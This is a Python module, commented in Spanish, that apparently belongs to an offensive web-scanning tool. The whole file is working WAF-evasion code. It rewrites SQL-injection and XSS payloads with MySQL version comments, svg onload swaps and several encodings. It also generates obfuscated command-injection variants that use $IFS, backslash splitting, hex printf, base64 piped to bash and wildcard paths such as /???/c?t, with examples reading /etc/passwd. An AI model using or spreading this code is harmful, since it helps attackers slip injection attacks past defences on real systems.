import random
import re
import base64
import urllib.parse
from typing import Callable, List, Optional
from app.utils.logger import logger


_SQL_KEYWORDS_UPPER = frozenset({"UNION", "SELECT", "INSERT", "DELETE"})
_XSS_KEYWORDS_UPPER = frozenset({"ALERT", "SCRIPT", "EVAL", "SYSTEM"})
_UNICODE_KEYWORDS   = _SQL_KEYWORDS_UPPER | _XSS_KEYWORDS_UPPER


_CMDI_KNOWN_PATHS: dict[str, str] = {
    "id":     "/usr/bin/id",
    "cat":    "/bin/cat",
    "bash":   "/bin/bash",
    "sh":     "/bin/sh",
    "whoami": "/usr/bin/whoami",
    "ls":     "/bin/ls",
    "echo":   "/bin/echo",
    "curl":   "/usr/bin/curl",
    "wget":   "/usr/bin/wget",
    "python": "/usr/bin/python3",
    "perl":   "/usr/bin/perl",
}


_IFS_VARIANTS = [
    "${IFS}",
    "$IFS",
    "$IFS$9",
    "${IFS}${IFS}",
    "$(printf '\\t')",
    "<>/dev/null;",
]


def _strategy_base64(payload: str) -> str:
    return base64.b64encode(payload.encode()).decode()


def _strategy_unicode(payload: str) -> str:
    for key in _UNICODE_KEYWORDS:
        pattern = re.compile(re.escape(key), re.IGNORECASE)
        for match in reversed(list(pattern.finditer(payload))):
            word      = match.group()
            uni       = f"\\u00{ord(word[0]):02x}"
            payload   = payload[:match.start()] + uni + word[1:] + payload[match.end():]
    return payload


def _strategy_hex(payload: str) -> str:
    if "=" in payload or "'" in payload:
        return payload
    return "".join(f"\\x{ord(c):02x}" for c in payload)


def _strategy_double_url(payload: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(payload))


def _strategy_none(payload: str) -> str:
    return payload


def _strategy_cmdi_wildcard(payload: str) -> str:
    """
    [v4.0.0] Técnica del meme: sustituye comandos conocidos dentro de payloads
    cmdi por rutas con comodines de globbing de Bash (? y *).
    El shell expande los comodines en tiempo de ejecución pero los WAFs basados
    en firmas de texto plano no los reconocen como comandos.

    Ejemplo:
        ;cat /etc/passwd  →  ;/???/c?t${IFS}/etc/passwd
        ;id               →  ;/???/id
        ;bash -c id       →  ;/???/b??h${IFS}-c${IFS}id
    """
    mutated = payload
    for cmd, full_path in _CMDI_KNOWN_PATHS.items():
        pattern = re.compile(
            r'(?<![/\w])' + re.escape(cmd) + r'(?!\w)',
            re.IGNORECASE,
        )
        if not pattern.search(mutated):
            continue


        ifs = random.choice(_IFS_VARIANTS[:4])


        parts      = full_path.rsplit("/", 1)
        dir_part   = parts[0]
        bin_name   = parts[1]


        mode = random.choices([1, 2, 3], weights=[40, 40, 20])[0]

        if mode == 1:

            glob_dir  = "/".join(
                seg[0] + "?" * (len(seg) - 1) if seg else seg
                for seg in dir_part.split("/")
            )
            glob_path = f"{glob_dir}/{bin_name}"
        elif mode == 2:

            glob_name = bin_name[0] + "?" * (len(bin_name) - 1)
            glob_path = f"{dir_part}/{glob_name}"
        else:

            glob_dir  = "/".join(
                seg[0] + "?" * (len(seg) - 1) if seg else seg
                for seg in dir_part.split("/")
            )
            glob_name = bin_name[0] + "?" * (len(bin_name) - 1)
            glob_path = f"{glob_dir}/{glob_name}"

        mutated = pattern.sub(glob_path, mutated)


        mutated = re.sub(r'(?<=' + re.escape(glob_path) + r') ', ifs, mutated, count=2)

    return mutated


_OBFUSCATION_STRATEGIES: dict[str, Callable[[str], str]] = {
    "base64":          _strategy_base64,
    "unicode":         _strategy_unicode,
    "hex":             _strategy_hex,
    "double_url":      _strategy_double_url,
    "cmdi_wildcard":   _strategy_cmdi_wildcard,
    "none":            _strategy_none,
}


_CMDI_STRATEGIES = ["cmdi_wildcard", "hex", "none", "double_url"]


def obfuscate_cmdi_command(command: str, technique: Optional[str] = None) -> List[str]:
    """
    [v4.0.0] Genera múltiples variantes obfuscadas de un comando Unix para evasión de WAF.
    Implementa las cuatro técnicas descritas en el meme de ciberseguridad:
      1. Backslash splitting  (e\\c\\h\\o)
      2. $IFS como separador de espacio
      3. Hex encoding via printf
      4. Wildcard globbing (/???/b??h)

    Args:
        command: Comando Unix simple, ej. "cat /etc/passwd" o "id"
        technique: Forzar una técnica específica ("wildcard"|"ifs"|"hex"|"backslash")
                   o None para generar todas.

    Returns:
        Lista de variantes obfuscadas del mismo comando semántico.
    """
    variants: List[str] = []
    cmd_parts = command.strip().split()
    if not cmd_parts:
        return variants

    base_cmd  = cmd_parts[0]
    cmd_args  = cmd_parts[1:]
    args_str  = " ".join(cmd_args)


    if technique in (None, "backslash"):
        bs_cmd = "\\".join(base_cmd)
        bs_args = "\\".join(args_str) if args_str else ""
        if bs_args:
            variants.append(f";{bs_cmd}${'{IFS}'}{bs_args}")
        else:
            variants.append(f";{bs_cmd}")


        quoted_cmd = "'".join(base_cmd)
        if args_str:
            variants.append(f";{quoted_cmd}${'{IFS}'}{args_str}")
        else:
            variants.append(f";{quoted_cmd}")


    if technique in (None, "ifs"):
        for ifs_var in _IFS_VARIANTS[:3]:
            if args_str:
                ifs_args = args_str.replace(" ", ifs_var)
                variants.append(f";{base_cmd}{ifs_var}{ifs_args}")
            else:
                variants.append(f";{base_cmd}")


        if cmd_args:
            variants.append(f";{{{base_cmd},{','.join(cmd_args)}}}")


    if technique in (None, "hex"):
        hex_cmd = "".join(f"\\x{ord(c):02x}" for c in base_cmd)
        ifs     = "${IFS}"
        if args_str:
            hex_args = "".join(f"\\x{ord(c):02x}" for c in args_str)
            variants.append(f";$(printf{ifs}'{hex_cmd}'{ifs}'{hex_args}')")

            b64_full = base64.b64encode(command.encode()).decode()
            variants.append(f";bash<<<$(echo{ifs}{b64_full}|base64{ifs}-d)")
        else:
            variants.append(f";$(printf{ifs}'{hex_cmd}')")
            b64_cmd = base64.b64encode(base_cmd.encode()).decode()
            variants.append(f";bash<<<$(echo{ifs}{b64_cmd}|base64{ifs}-d)")


    if technique in (None, "wildcard"):
        full_path = _CMDI_KNOWN_PATHS.get(base_cmd.lower())
        if full_path:
            dir_p, bin_n = full_path.rsplit("/", 1)
            ifs = "${IFS}"


            glob_dir_a = "/".join(
                (seg[0] + "?" * (len(seg) - 1)) if seg else seg
                for seg in dir_p.split("/")
            )
            glob_path_a = f"{glob_dir_a}/{bin_n}"


            glob_name_b = bin_n[0] + "?" * (len(bin_n) - 1)
            glob_path_b = f"{dir_p}/{glob_name_b}"


            glob_path_c = f"{glob_dir_a}/{glob_name_b}"

            for glob_path in (glob_path_a, glob_path_b, glob_path_c):
                if args_str:
                    ifs_args = args_str.replace(" ", ifs)
                    variants.append(f";{glob_path}{ifs}{ifs_args}")
                    variants.append(f";$({glob_path}{ifs}{ifs_args})")
                else:
                    variants.append(f";{glob_path}")
                    variants.append(f";$({glob_path})")
        else:

            glob_generic = f"/???/{base_cmd[0]}{'?' * (len(base_cmd) - 1)}"
            ifs          = "${IFS}"
            if args_str:
                variants.append(f";{glob_generic}{ifs}{args_str.replace(' ', ifs)}")
            else:
                variants.append(f";{glob_generic}")


    seen = set()
    unique_variants = []
    for v in variants:
        if v not in seen:
            seen.add(v)
            unique_variants.append(v)

    return unique_variants


def apply_waf_evasion(payload: str, waf_profile: str = "auto", context: str = "url") -> str:
    """
    [v4.0.0] Universal WAF Evasion Module.
    Combines advanced identity and payload evasion techniques originally partitioned
    across M2 Adaptive Generator and M5 Ghost Protocol.

    Para payloads de inyección de comandos (context='cmdi'), prioriza
    estrategias orientadas a bypass de firma de comandos Unix.
    """
    if not isinstance(payload, str):
        return payload

    mutated = payload


    if waf_profile in ("cloudflare", "auto"):
        mutated_upper = mutated.upper()
        if _SQL_KEYWORDS_UPPER & set(mutated_upper.split()):
            mutated = mutated.replace(" ", "/**/")
            mutated = re.sub(r'UNION',  '/*!50000UNION*/',  mutated, flags=re.IGNORECASE)
            mutated = re.sub(r'SELECT', '/*!50000SELECT*/', mutated, flags=re.IGNORECASE)

        if "<script>" in mutated.lower() and random.random() > 0.50:
            mutated = re.sub(r'<script>',  '<svg/onload=', mutated, flags=re.IGNORECASE)
            mutated = re.sub(r'</script>', '>',            mutated, flags=re.IGNORECASE)


    if context == "cmdi" and random.random() < 0.5:
        strategy = random.choice(_CMDI_STRATEGIES)
    else:

        if random.random() < 0.3:
            return mutated
        strategy = random.choice(list(_OBFUSCATION_STRATEGIES))

    apply_fn = _OBFUSCATION_STRATEGIES[strategy]

    try:
        result = apply_fn(mutated)
        logger.debug(f"[WAF Evasion] Payload mutado usando '{strategy}' (perfil: {waf_profile})")
        return result
    except Exception as exc:
        logger.debug(f"[WAF Evasion] Error aplicando estrategia {strategy}: {exc}")
        return payload
